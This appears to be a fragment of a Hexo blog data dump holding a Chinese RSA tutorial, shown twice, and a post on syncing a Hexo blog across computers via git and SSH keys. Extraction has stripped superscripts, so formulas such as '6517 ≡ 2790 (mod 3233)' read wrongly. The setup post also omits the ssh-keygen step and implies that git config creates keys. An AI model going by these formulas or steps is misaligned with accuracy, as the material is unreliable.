href=\"#Generate-key-生成密钥\" class=\"headerlink\" title=\"Generate key(生成密钥)\"></a>Generate key(生成密钥)</h2><p>eg.假设爱丽丝要与鲍勃进行加密通信，她该怎么生成公钥和私钥呢？</p>\n<h3 id=\"step1：随机选择两个不相等的质数p和q。\"><a href=\"#step1：随机选择两个不相等的质数p和q。\" class=\"headerlink\" title=\"step1：随机选择两个不相等的质数p和q。\"></a>step1：随机选择两个不相等的质数p和q。</h3><p>p=61 &amp; q=53(实际应用中，这两个质数越大，就越难破解。)</p>\n<h3 id=\"step2-计算p和q的乘积n\"><a href=\"#step2-计算p和q的乘积n\" class=\"headerlink\" title=\"step2:计算p和q的乘积n\"></a>step2:计算p和q的乘积n</h3><pre><code>n = 61×53 = 3233\n</code></pre><p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位</p>\n<h3 id=\"step3-计算n的欧拉函数φ-n\"><a href=\"#step3-计算n的欧拉函数φ-n\" class=\"headerlink\" title=\"step3:计算n的欧拉函数φ(n)\"></a>step3:计算n的欧拉函数φ(n)</h3><p>公式：<br>    φ(n) = (p-1)(q-1)<br>算出φ(3233)等于60×52，即3120。</p>\n<h3 id=\"step4-随机选择一个整数e，条件是1-lt-e-lt-φ-n-，且e与φ-n-互质\"><a href=\"#step4-随机选择一个整数e，条件是1-lt-e-lt-φ-n-，且e与φ-n-互质\" class=\"headerlink\" title=\"step4:随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质\"></a>step4:随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质</h3><p>爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p>\n<h3 id=\"step5\"><a href=\"#step5\" class=\"headerlink\" title=\"step5:\"></a>step5:</h3><pre><code>所谓&quot;模反元素&quot;就是指有一个整数d，可以使得ed被φ(n)除的余数为1。\n　　ed ≡ 1 (mod φ(n))\n这个式子等价于\n　　ed - 1 = kφ(n)\n于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。\n　　ex + φ(n)y = 1\n已知 e=17, φ(n)=3120，\n　　17x + 3120y = 1\n这个方程可以用&quot;扩展欧几里得算法&quot;求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。\n至此所有计算完成。\n</code></pre><h3 id=\"step6-将n和e封装成公钥，n和d封装成私钥。\"><a href=\"#step6-将n和e封装成公钥，n和d封装成私钥。\" class=\"headerlink\" title=\"step6:将n和e封装成公钥，n和d封装成私钥。\"></a>step6:将n和e封装成公钥，n和d封装成私钥。</h3><p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。<br>实际应用中，公钥和私钥的数据都采用ASN.1格式表达（实例）。</p>\n<h3 id=\"step7-RSA算法的可靠性\"><a href=\"#step7-RSA算法的可靠性\" class=\"headerlink\" title=\"step7:RSA算法的可靠性\"></a>step7:RSA算法的可靠性</h3><p>回顾上面的密钥生成步骤，一共出现六个数字：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">  　p</div><div class=\"line\">　　q</div><div class=\"line\">　　n</div><div class=\"line\">　　φ(n)</div><div class=\"line\">　　e</div><div class=\"line\">　　d</div></pre></td></tr></table></figure></p>\n<p>这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。</p>\n<p>那么，有无可能在已知n和e的情况下，推导出d？</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">　　（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</div><div class=\"line\">　　（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</div><div class=\"line\">　　（3）n=pq。只有将n因数分解，才能算出p和q。</div></pre></td></tr></table></figure>\n<p>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。<br>大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。</p>\n<p>举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">　　12301866845301177551304949</div><div class=\"line\">　　58384962720772853569595334</div><div class=\"line\">　　79219732245215172640050726</div><div class=\"line\">　　36575187452021997864693899</div><div class=\"line\">　　56474942774063845925192557</div><div class=\"line\">　　32630345373154826850791702</div><div class=\"line\">　　61221429134616704292143116</div><div class=\"line\">　　02221240479274737794080665</div><div class=\"line\">　　351419597459856902143413</div><div class=\"line\">它等于这样两个质数的乘积</div><div class=\"line\">　　33478071698956898786044169</div><div class=\"line\">　　84821269081770479498371376</div><div class=\"line\">　　85689124313889828837938780</div><div class=\"line\">　　02287614711652531743087737</div><div class=\"line\">　　814467999489</div><div class=\"line\">　　　　×</div><div class=\"line\">　　36746043666799590428244633</div><div class=\"line\">　　79962795263227915816434308</div><div class=\"line\">　　76426760322838157396665112</div><div class=\"line\">　　79233373417143396810270092</div><div class=\"line\">　　798736308917</div></pre></td></tr></table></figure></p>\n<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>\n<h3 id=\"step8-加密和解密\"><a href=\"#step8-加密和解密\" class=\"headerlink\" title=\"step8:加密和解密\"></a>step8:加密和解密</h3><pre><code>有了公钥和密钥，就能进行加密和解密了。\n（1）加密要用公钥 (n,e)\n假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。\n所谓&quot;加密&quot;，就是算出下式的c：\n　　me ≡ c (mod n)\n爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：\n　　6517 ≡ 2790 (mod 3233)\n于是，c等于2790，鲍勃就把2790发给了爱丽丝。\n（2）解密要用私钥(n,d)\n爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：\n　　cd ≡ m (mod n)\n也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出\n　　27902753 ≡ 65 (mod 3233)\n因此，爱丽丝知道了鲍勃加密前的原文就是65。\n至此，&quot;加密--解密&quot;的整个过程全部完成。\n我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。\n你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种&quot;对称性加密算法&quot;（比如DES），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。\n</code></pre><h3 id=\"step9-私钥解密的证明\"><a href=\"#step9-私钥解密的证明\" class=\"headerlink\" title=\"step9:私钥解密的证明\"></a>step9:私钥解密的证明</h3><pre><code>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：\n　　cd ≡ m (mod n)\n因为，根据加密规则\n　　ｍe ≡ c (mod n)\n于是，c可以写成下面的形式：\n　　c = me - kn\n将c代入要我们要证明的那个解密规则：\n　　(me - kn)d ≡ m (mod n)\n它等同于求证\n　　med ≡ m (mod n)\n由于\n　　ed ≡ 1 (mod φ(n))\n所以\n　　ed = hφ(n)+1\n将ed代入：\n　　mhφ(n)+1 ≡ m (mod n)\n接下来，分成两种情况证明上面这个式子。\n（1）m与n互质。\n根据欧拉定理，此时\n　　mφ(n) ≡ 1 (mod n)\n得到\n　　(mφ(n))h × m ≡ m (mod n)\n原式得到证明。\n（2）m与n不是互质关系。\n此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。\n以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：\n　　(kp)q-1 ≡ 1 (mod q)\n进一步得到\n　　[(kp)q-1]h(p-1) × kp ≡ kp (mod q)\n即\n　　(kp)ed ≡ kp (mod q)\n将它改写成下面的等式\n　　(kp)ed = tq + kp\n这时t必然能被p整除，即 t=t&apos;p\n　　(kp)ed = t&apos;pq + kp\n因为 m=kp，n=pq，所以\n　　med ≡ m (mod n)\n原式得到证明。\n</code></pre><h3 id=\"摘录\"><a href=\"#摘录\" class=\"headerlink\" title=\"摘录\"></a>摘录</h3><p><a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\" target=\"_blank\" rel=\"external\">more info1</a><br><a href=\"http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html\" target=\"_blank\" rel=\"external\">more info2</a></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。<br>RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和<br>伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。</p>\n<p>1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。</p>\n<p>对极大整数做因数分解的难度决定了RSA算法的可靠性。即对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到2016年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。<br><img src=\"/upload_image/rsa.jpg\" alt=\"RSA\"></p>\n<h2 id=\"RSA算法\"><a href=\"#RSA算法\" class=\"headerlink\" title=\"RSA算法\"></a>RSA算法</h2><h3 id=\"密钥：\"><a href=\"#密钥：\" class=\"headerlink\" title=\"密钥：\"></a>密钥：</h3><p>加密和解密使用的规则（简称“密钥”）</p>\n<h3 id=\"对称加密算法-Symmetric-key-algorithm\"><a href=\"#对称加密算法-Symmetric-key-algorithm\" class=\"headerlink\" title=\"对称加密算法(Symmetric-key algorithm):\"></a>对称加密算法(Symmetric-key algorithm):</h3><pre><code>加密和解密使用同一密钥（规则）的算法。\n（1）甲方选择某一种加密规则，对信息进行加密；\n（2）乙方使用同一种规则，对信息进行解密。\n</code></pre><h3 id=\"非对称加密算法：\"><a href=\"#非对称加密算法：\" class=\"headerlink\" title=\"非对称加密算法：\"></a>非对称加密算法：</h3><pre><code>加密和解密不使用同一规则，只要两种规则之间存在某种对应关系即可，可避免直接传递密钥。以&quot;公钥&quot;及&quot;私钥&quot;形成对应关系。公钥公开，私钥保密。\n（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，私钥则保密。\n（2）甲方获取乙方的公钥，然后用它对信息加密。\n（3）乙方得到加密后的信息，用私钥解密。\n</code></pre><h2 id=\"four-Mathematic-Theory\"><a href=\"#four-Mathematic-Theory\" class=\"headerlink\" title=\"four Mathematic Theory\"></a>four Mathematic Theory</h2><p>They can help you understand RSA much better. RSA is based on these four knowledge.</p>\n<h3 id=\"1-coprime-互质关系\"><a href=\"#1-coprime-互质关系\" class=\"headerlink\" title=\"1.coprime(互质关系)\"></a>1.coprime(互质关系)</h3><p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。<br>　　1. 任意两个质数构成互质关系，比如13和61。<br>　　2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。<br>　　3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。<br>　　4. 1和任意一个自然数是都是互质关系，比如1和99。<br>　　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。<br>　　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p>\n<h3 id=\"2-欧拉函数\"><a href=\"#2-欧拉函数\" class=\"headerlink\" title=\"2.欧拉函数\"></a>2.欧拉函数</h3><p><img src=\"/upload_image/oula.jpg\" alt=\"欧拉\"><br>欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。<br><a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\" target=\"_blank\" rel=\"external\">detail</a></p>\n<h3 id=\"3-模反元素\"><a href=\"#3-模反元素\" class=\"headerlink\" title=\"3.模反元素\"></a>3.模反元素</h3><p><img src=\"/upload_image/mofan.jpg\" alt=\"mofan\"></p>\n<h3 id=\"4-二进制与十进制转换算法\"><a href=\"#4-二进制与十进制转换算法\" class=\"headerlink\" title=\"4.二进制与十进制转换算法\"></a>4.二进制与十进制转换算法</h3><pre><code>十进制转二进制：\n    用2辗转相除至结果为1 \n    将余数和最后的1从下向上倒序写 就是结果\n    例如302\n    302/2 = 151 余0 \n    151/2 = 75 余1 \n    75/2 = 37 余1 \n    37/2 = 18 余1 \n    18/2 = 9 余0 \n    9/2 = 4 余1 \n    4/2 = 2 余0 \n    2/2 = 1 余0 \n    故二进制为100101110 \n\n二进制转十进制:\n    从最后一位开始算，依次列为第0、1、2...位\n    第n位的数（0或1）乘以2的n次方\n    得到的结果相加就是答案\n    例如:01101011.转十进制: \n    第0位:1乘2的0次方=1 \n    1乘2的1次方=2 \n    0乘2的2次方＝0 \n    1乘2的3次方＝8  \n    0乘2的4次方＝0 \n    1乘2的5次方＝32 \n    1乘2的6次方＝64 \n    0乘2的7次方＝0 \n    然后：1＋2＋0 \n     ＋8＋0＋32＋64＋0＝107． \n    二进制01101011＝十进制107．\n</code></pre><h2 id=\"Generate-key-生成密钥\"><a href=\"#Generate-key-生成密钥\" class=\"headerlink\" title=\"Generate key(生成密钥)\"></a>Generate key(生成密钥)</h2><p>eg.假设爱丽丝要与鲍勃进行加密通信，她该怎么生成公钥和私钥呢？</p>\n<h3 id=\"step1：随机选择两个不相等的质数p和q。\"><a href=\"#step1：随机选择两个不相等的质数p和q。\" class=\"headerlink\" title=\"step1：随机选择两个不相等的质数p和q。\"></a>step1：随机选择两个不相等的质数p和q。</h3><p>p=61 &amp; q=53(实际应用中，这两个质数越大，就越难破解。)</p>\n<h3 id=\"step2-计算p和q的乘积n\"><a href=\"#step2-计算p和q的乘积n\" class=\"headerlink\" title=\"step2:计算p和q的乘积n\"></a>step2:计算p和q的乘积n</h3><pre><code>n = 61×53 = 3233\n</code></pre><p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位</p>\n<h3 id=\"step3-计算n的欧拉函数φ-n\"><a href=\"#step3-计算n的欧拉函数φ-n\" class=\"headerlink\" title=\"step3:计算n的欧拉函数φ(n)\"></a>step3:计算n的欧拉函数φ(n)</h3><p>公式：<br>    φ(n) = (p-1)(q-1)<br>算出φ(3233)等于60×52，即3120。</p>\n<h3 id=\"step4-随机选择一个整数e，条件是1-lt-e-lt-φ-n-，且e与φ-n-互质\"><a href=\"#step4-随机选择一个整数e，条件是1-lt-e-lt-φ-n-，且e与φ-n-互质\" class=\"headerlink\" title=\"step4:随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质\"></a>step4:随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质</h3><p>爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p>\n<h3 id=\"step5\"><a href=\"#step5\" class=\"headerlink\" title=\"step5:\"></a>step5:</h3><pre><code>所谓&quot;模反元素&quot;就是指有一个整数d，可以使得ed被φ(n)除的余数为1。\n　　ed ≡ 1 (mod φ(n))\n这个式子等价于\n　　ed - 1 = kφ(n)\n于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。\n　　ex + φ(n)y = 1\n已知 e=17, φ(n)=3120，\n　　17x + 3120y = 1\n这个方程可以用&quot;扩展欧几里得算法&quot;求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。\n至此所有计算完成。\n</code></pre><h3 id=\"step6-将n和e封装成公钥，n和d封装成私钥。\"><a href=\"#step6-将n和e封装成公钥，n和d封装成私钥。\" class=\"headerlink\" title=\"step6:将n和e封装成公钥，n和d封装成私钥。\"></a>step6:将n和e封装成公钥，n和d封装成私钥。</h3><p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。<br>实际应用中，公钥和私钥的数据都采用ASN.1格式表达（实例）。</p>\n<h3 id=\"step7-RSA算法的可靠性\"><a href=\"#step7-RSA算法的可靠性\" class=\"headerlink\" title=\"step7:RSA算法的可靠性\"></a>step7:RSA算法的可靠性</h3><p>回顾上面的密钥生成步骤，一共出现六个数字：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">  　p</div><div class=\"line\">　　q</div><div class=\"line\">　　n</div><div class=\"line\">　　φ(n)</div><div class=\"line\">　　e</div><div class=\"line\">　　d</div></pre></td></tr></table></figure></p>\n<p>这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。</p>\n<p>那么，有无可能在已知n和e的情况下，推导出d？</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">　　（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</div><div class=\"line\">　　（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</div><div class=\"line\">　　（3）n=pq。只有将n因数分解，才能算出p和q。</div></pre></td></tr></table></figure>\n<p>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。<br>大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。</p>\n<p>举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">　　12301866845301177551304949</div><div class=\"line\">　　58384962720772853569595334</div><div class=\"line\">　　79219732245215172640050726</div><div class=\"line\">　　36575187452021997864693899</div><div class=\"line\">　　56474942774063845925192557</div><div class=\"line\">　　32630345373154826850791702</div><div class=\"line\">　　61221429134616704292143116</div><div class=\"line\">　　02221240479274737794080665</div><div class=\"line\">　　351419597459856902143413</div><div class=\"line\">它等于这样两个质数的乘积</div><div class=\"line\">　　33478071698956898786044169</div><div class=\"line\">　　84821269081770479498371376</div><div class=\"line\">　　85689124313889828837938780</div><div class=\"line\">　　02287614711652531743087737</div><div class=\"line\">　　814467999489</div><div class=\"line\">　　　　×</div><div class=\"line\">　　36746043666799590428244633</div><div class=\"line\">　　79962795263227915816434308</div><div class=\"line\">　　76426760322838157396665112</div><div class=\"line\">　　79233373417143396810270092</div><div class=\"line\">　　798736308917</div></pre></td></tr></table></figure></p>\n<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>\n<h3 id=\"step8-加密和解密\"><a href=\"#step8-加密和解密\" class=\"headerlink\" title=\"step8:加密和解密\"></a>step8:加密和解密</h3><pre><code>有了公钥和密钥，就能进行加密和解密了。\n（1）加密要用公钥 (n,e)\n假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。\n所谓&quot;加密&quot;，就是算出下式的c：\n　　me ≡ c (mod n)\n爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：\n　　6517 ≡ 2790 (mod 3233)\n于是，c等于2790，鲍勃就把2790发给了爱丽丝。\n（2）解密要用私钥(n,d)\n爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：\n　　cd ≡ m (mod n)\n也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出\n　　27902753 ≡ 65 (mod 3233)\n因此，爱丽丝知道了鲍勃加密前的原文就是65。\n至此，&quot;加密--解密&quot;的整个过程全部完成。\n我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。\n你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种&quot;对称性加密算法&quot;（比如DES），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。\n</code></pre><h3 id=\"step9-私钥解密的证明\"><a href=\"#step9-私钥解密的证明\" class=\"headerlink\" title=\"step9:私钥解密的证明\"></a>step9:私钥解密的证明</h3><pre><code>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：\n　　cd ≡ m (mod n)\n因为，根据加密规则\n　　ｍe ≡ c (mod n)\n于是，c可以写成下面的形式：\n　　c = me - kn\n将c代入要我们要证明的那个解密规则：\n　　(me - kn)d ≡ m (mod n)\n它等同于求证\n　　med ≡ m (mod n)\n由于\n　　ed ≡ 1 (mod φ(n))\n所以\n　　ed = hφ(n)+1\n将ed代入：\n　　mhφ(n)+1 ≡ m (mod n)\n接下来，分成两种情况证明上面这个式子。\n（1）m与n互质。\n根据欧拉定理，此时\n　　mφ(n) ≡ 1 (mod n)\n得到\n　　(mφ(n))h × m ≡ m (mod n)\n原式得到证明。\n（2）m与n不是互质关系。\n此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。\n以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：\n　　(kp)q-1 ≡ 1 (mod q)\n进一步得到\n　　[(kp)q-1]h(p-1) × kp ≡ kp (mod q)\n即\n　　(kp)ed ≡ kp (mod q)\n将它改写成下面的等式\n　　(kp)ed = tq + kp\n这时t必然能被p整除，即 t=t&apos;p\n　　(kp)ed = t&apos;pq + kp\n因为 m=kp，n=pq，所以\n　　med ≡ m (mod n)\n原式得到证明。\n</code></pre><h3 id=\"摘录\"><a href=\"#摘录\" class=\"headerlink\" title=\"摘录\"></a>摘录</h3><p><a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\" target=\"_blank\" rel=\"external\">more info1</a><br><a href=\"http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html\" target=\"_blank\" rel=\"external\">more info2</a></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>"},{"title":"hexo博客异地同步","_content":"## hexo blog 异地同步\n### 问题起源\n很早前搭建了一个hexo的博客，用的是家里的电脑搭建的，一直只能在家里同步。于是和朋友讨论是否能在其它电脑上进行同步文件，很尴尬的一点是他成功了，而我却因为认证方式的问题一直未能进行异地同步。对于一个耿直的我来说分分钟想把这个博客撤了，内心真的是郁闷极了。看过网上有很多的类似的问题，也有和我报错相同的文章，但是都一一试过，结果还是以失败告终，真想爆一句“F**K”。通过分析发现，其实是一个登陆认证的问题；但是因为家里电脑用的是ssl登录认证，在deployer的时候并不需要输入密码。在git文件夹下翻了半天，结果都没有找到我的密码保存的目录。\n\n### 环境搭建\n首先，在新机子上搭建博客其实就是重复搭建hexo博客的过程，关键是新机子需要和你的github建立一个认证。\n（一）准备工作：\n前提：根据这篇文章[http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/]\n已经把家里pc上的内容put到github新项目中（https://github.com/BBB-man/myblogdate）\n1.下载[node.js](https://nodejs.org/en/)，安装，默认会安装npm\n\n2.安装[git](https://github.com/git-for-windows/git/releases)\n注意：认证在此处出现\n\t关于github的配置，需要将新机器的SSH公钥添加到github上的https://github.com/settings/keys中,这里是关键。\n输入以下命令，得到key：\n``` bash\n$ git config --global user.email \"xxxxx@gmail.com\"    #enter your email(github registered)\n$ git config --global user.name \"xxxx\"\t\t#enter whatever\n```\n回车到底，此时会默认在c盘中（C:\\Users\\xxx\\.ssh\\）目录下生成文件id_rsa/id_rsa.pub。\n![id_rsa.pub](/upload_image/id_rsa_pub.jpg)\n然后将id_rsa.pub文件中的内容复制到github的key文本框中。\n![gitkey](/upload_image/gitkey.jpg)\n可以通过命令：\n``` bash\n$ ssh -T git@github.com\n```\n来验证一下\n\n3.安装hexo    打开cmd, 运行：npm install -g hexo\n\n*创建一个Myblog文件夹\n*把github中的备份文件clone到Myblog中\n``` bash\n$ git clone https://github.com/BBB-man/myblogdate\n```\n*在Myblog中运行命令：(会产生一个hexo列表)\n``` bash\n$ hexo init\n```\n*将Myblog里面的node_modules和scafflods文件复制到clone下来的myblogdate文件夹中\n\n（二）问题调试\n1. 修改本地_config.yml文件的deploy配置\n``` bash\ndeploy:\ntype: git\nrepository: git@github.com:BBB-man/BBB-man.github.io.git   #这里改成这个，原先为https的\nbranch: master\n```\n\n\n2. 做完上述的工作，说明认证方式已经没问题了。但是因为某些原因在执行“hexo d”的操作中会报错，原因我就不多说了，直接执行以下命令：\n``` bash\n$ npm install hexo-deployer-git --save\n```\n再次推送即可\n\n### sign: bman","source":"_posts/hexo博客异地同步.md","raw":"---\ntitle: hexo博客异地同步\n---\n## hexo blog 异地同步\n### 问题起源\n很早前搭建了一个hexo的博客，用的是家里的电脑搭建的，一直只能在家里同步。于是和朋友讨论是否能在其它电脑上进行同步文件，很尴尬的一点是他成功了，而我却因为认证方式的问题一直未能进行异地同步。对于一个耿直的我来说分分钟想把这个博客撤了，内心真的是郁闷极了。看过网上有很多的类似的问题，也有和我报错相同的文章，但是都一一试过，结果还是以失败告终，真想爆一句“F**K”。通过分析发现，其实是一个登陆认证的问题；但是因为家里电脑用的是ssl登录认证，在deployer的时候并不需要输入密码。在git文件夹下翻了半天，结果都没有找到我的密码保存的目录。\n\n### 环境搭建\n首先，在新机子上搭建博客其实就是重复搭建hexo博客的过程，关键是新机子需要和你的github建立一个认证。\n（一）准备工作：\n前提：根据这篇文章[http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/]\n已经把家里pc上的内容put到github新项目中（https://github.com/BBB-man/myblogdate）\n1.下载[node.js](https://nodejs.org/en/)，安装，默认会安装npm\n\n2.安装[git](https://github.com/git-for-windows/git/releases)\n注意：认证在此处出现\n\t关于github的配置，需要将新机器的SSH公钥添加到github上的https://github.com/settings/keys中,这里是关键。\n输入以下命令，得到key：\n``` bash\n$ git config --global user.email \"xxxxx@gmail.com\"    #enter your email(github registered)\n$ git config --global user.name \"xxxx\"\t\t#enter whatever\n```\n回车到底，此时会默认在c盘中（C:\\Users\\xxx\\.ssh\\）目录下生成文件id_rsa/id_rsa.pub。\n![id_rsa.pub](/upload_image/id_rsa_pub.jpg)\n然后将id_rsa.pub文件中的内容复制到github的key文本框中。\n![gitkey](/upload_image/gitkey.jpg)\n可以通过命令：\n``` bash\n$ ssh -T git@github.com\n```\n来验证一下\n\n3.安装hexo    打开cmd, 运行：npm install -g hexo\n\n*创建一个Myblog文件夹\n*把github中的备份文件clone到Myblog中\n``` bash\n$ git clone https://github.com/BBB-man/myblogdate\n```\n*在Myblog中运行命令：(会产生一个hexo列表)\n``` bash\n$ hexo init\n```\n*将Myblog里面的node_modules和scafflods文件复制到clone下来的myblogdate文件夹中\n\n（二）问题调试\n1. 修改本地_config.yml文件的deploy配置\n``` bash\ndeploy:\ntype: git\nrepository: git@github.com:BBB-man/BBB-man.github.io.git   #这里改成这个，原先为https的\nbranch: master\n```\n\n\n2. 做完上述的工作，说明认证方式已经没问题了。但是因为某些原因在执行“hexo 